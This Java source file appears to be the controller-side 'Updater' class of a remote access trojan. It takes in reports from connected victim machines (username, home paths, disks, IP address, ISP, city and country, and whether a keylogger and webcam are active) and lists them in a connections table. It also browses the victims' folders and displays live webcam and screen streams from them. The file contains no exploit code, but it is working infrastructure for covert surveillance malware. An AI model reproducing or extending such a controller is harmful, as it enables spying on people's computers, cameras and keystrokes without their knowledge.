package Connections;

import GUI.Main;
import GUI.TableUtils.FileManager.FileManagerGUI;
import GUI.TableUtils.ScreenStreaming.ScreenStreamerGUI;
import GUI.TableUtils.WebcamManager.WebcamGUI;
import Information.NetworkInformation;
import Information.SystemInformation;
import org.json.JSONArray;
import org.json.JSONObject;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Updater {
    private final Client client;

    public Updater(Client client) {
        this.client = client;
    }

    private FileManagerGUI fileManagerGUI;

    private WebcamGUI webcamGUI;

    private ScreenStreamerGUI screenStreamerGUI;

    private void convertJSON2NetAndSysInfo(JSONObject jsonObject) {
        String operatingSystem = jsonObject.getString("win_ver");
        String userProfile = jsonObject.getString("user_profile");
        String homePath = jsonObject.getString("home_path");
        String homeDrive = jsonObject.getString("home_drive");
        String username = jsonObject.getString("username");
        JSONArray userDisksJsonArray = jsonObject.getJSONArray("disks");
        List<String> listOfDisks = userDisksJsonArray.toList().stream()
                .map(Object::toString)
                .toList();
        String tagName = jsonObject.getString("tag_name");
        boolean webcam = jsonObject.getBoolean("webcam");
        boolean keylogger = jsonObject.getBoolean("keylogger");
        String uuid = jsonObject.getString("mutex");
        client.setSysInfo(new SystemInformation(operatingSystem, userProfile, homePath, homeDrive, username, listOfDisks, tagName, webcam, keylogger, uuid));
        String ip = jsonObject.getString("query");
        String internetCompanyName = jsonObject.getString("isp");
        String userContinent = jsonObject.getString("continent");
        String userCountry = jsonObject.getString("country");
        String userRegion = jsonObject.getString("region");
        String userCity = jsonObject.getString("city");
        String userZone = jsonObject.getString("timezone");
        String userCurrency = jsonObject.getString("currency");
        boolean userProxy = jsonObject.getBoolean("proxy");
        client.setNetInfo(new NetworkInformation(ip, internetCompanyName, userContinent, userCountry, userRegion, userCity, userZone, userCurrency, userProxy));
    }

    public void addRowOfNewConnection(JSONObject jsonObject) {
        convertJSON2NetAndSysInfo(jsonObject);
        SystemInformation sysInfo = client.getSysInfo();
        NetworkInformation netInfo = client.getNetInfo();
        SwingUtilities.invokeLater(() -> {
            TableModel tableModel = Main.gui.getConnectionsTable().getModel();
            /*int existingClientRow = getPositionOfExisting(identifier, tableModel); // position if exists in JTable
            if (existingClientRow != -1) {  // change state of connection
                tableModel.setValueAt("Connected", existingClientRow, tableModel.getColumnCount() - 1);
            } else { // new connection*/
            String[] tableRow = new String[]{
                    sysInfo.UUID(),
                    netInfo.IP(),
                    netInfo.USER_COUNTRY(),
                    sysInfo.TAG_NAME(),
                    sysInfo.USER_NAME(),
                    sysInfo.OPERATING_SYSTEM(),
                    "Connected"
            };
            DefaultTableModel defaultTableModel = (DefaultTableModel) tableModel;
            defaultTableModel.addRow(tableRow);
            // }
            //if (ServerGUI.isNotifications() && SystemTray.isSupported())
            //  displayTray(netInfo.IP(), sysInfo.OPERATING_SYSTEM());
            Main.gui.updateNumOfConnectedClients();
        });
    }

    public void updateDisks(JSONObject jsonObject) {
        JSONArray jsonArray = jsonObject.getJSONArray("disks");
        fileManagerGUI.addDisks(jsonArray.toList().stream()
                .map(Object::toString)
                .toList());
    }


    public void updateDirectory(JSONObject jsonObject) {
        String path = jsonObject.getString("requested_directory");
        List<String> list = new ArrayList<>(Arrays.asList(jsonObject.getString("directory").split("\\|")));
        int divider = list.indexOf("/");
        System.out.println(divider);
        list.remove(divider);
        SwingUtilities.invokeLater(() -> {
            if (list != null) {
                System.out.println();
                if (!list.isEmpty() && list.get(0).equals("ACCESS_DENIED")) {
                    JOptionPane.showMessageDialog(fileManagerGUI.getFileManagerDialog(), "Access denied to this folder",
                            "Access denied", JOptionPane.ERROR_MESSAGE);
                    fileManagerGUI.getStack().pop();
                } else {
                    fileManagerGUI.setDivider(divider);
                    fileManagerGUI.getPathField().setText(path);
                    DefaultTableModel tableModel = (DefaultTableModel) fileManagerGUI.getTable().getModel();
                    tableModel.setRowCount(0);
                    tableModel.addRow(new String[]{"..."});
                    for (int i = 0; i < list.size(); i++) {
                        if (i >= divider) {
                            tableModel.addRow(new String[]{list.get(i), list.get(i + 1)});
                            i++;
                        } else tableModel.addRow(new String[]{list.get(i), ""});

                    }
                    fileManagerGUI.getScrollPane().getVerticalScrollBar().setValue(0);
                }
            } else {
                //  new ClientErrorHandler("Unable to enter directory, connection lost with client",
                //         fileManagerGUI.getFileManagerDialog(),
                //         fileManagerGUI.getStream().getClientSocket());
            }
        });
    }

    private void disableButtons() {
        webcamGUI.getBoxOfDevices().setEnabled(false);
        webcamGUI.getStartButton().setEnabled(false);
        webcamGUI.getRecordButton().setEnabled(false);
        webcamGUI.getSnapshotButton().setEnabled(false);
        webcamGUI.getSaveRecordButton().setEnabled(false);
    }

    private void enableBasicButtons() {
        webcamGUI.getBoxOfDevices().setEnabled(true);
        webcamGUI.getStartButton().setEnabled(true);
        webcamGUI.getRecordButton().setEnabled(false);
        webcamGUI.getSnapshotButton().setEnabled(false);
        webcamGUI.getSaveRecordButton().setEnabled(false);
    }

    private void enableButtons() {
        if (webcamGUI.getBoxOfDevices().getSelectedIndex() != -1) {
            enableBasicButtons();
        } else {
            disableButtons();
        }
    }

    public void updateWebcamDevices(JSONObject jsonObject) {
        List<Object> listOfWebcams = jsonObject.getJSONArray("list_of_webcams").toList();
        SwingUtilities.invokeLater(() -> {
            if (listOfWebcams != null) {
                if (listOfWebcams.isEmpty()) {
                    disableButtons();
                    webcamGUI.getBoxOfDevices().addItem("No webcam found");
                } else {
                    for (Object listOfWebcam : listOfWebcams) {
                        webcamGUI.getBoxOfDevices().addItem((String) listOfWebcam);
                    }
                    enableButtons();
                }
            }
        });

    }

    void updateFrameOfWebcamStreamer(byte[] data) {
        webcamGUI.setLastFrame(data);
        SwingUtilities.invokeLater(() -> {
            ImageIcon tempIMG = new ImageIcon(data);
            webcamGUI.getWebcamLabel().setIcon(tempIMG);
        });
    }

    public void updateFrameOfScreenStreamer(byte[] finalData) {
        ImageIcon tempIMG = new ImageIcon(finalData);
        Image img = tempIMG.getImage();
        Image imgScale = img.getScaledInstance(screenStreamerGUI.getDialog().getWidth(), screenStreamerGUI.getDialog().getHeight(), Image.SCALE_SMOOTH);
        SwingUtilities.invokeLater(() -> {
            screenStreamerGUI.getStreamingScreenShower().setIcon(new ImageIcon(imgScale));
        });
    }


    public void setFileManagerGUI(FileManagerGUI fileManagerGUI) {
        this.fileManagerGUI = fileManagerGUI;
    }

    public void setWebcamGUI(WebcamGUI webcamGUI) {
        this.webcamGUI = webcamGUI;
    }

    public void setScreenStreamerGUI(ScreenStreamerGUI screenStreamerGUI) {
        this.screenStreamerGUI = screenStreamerGUI;
    }


}
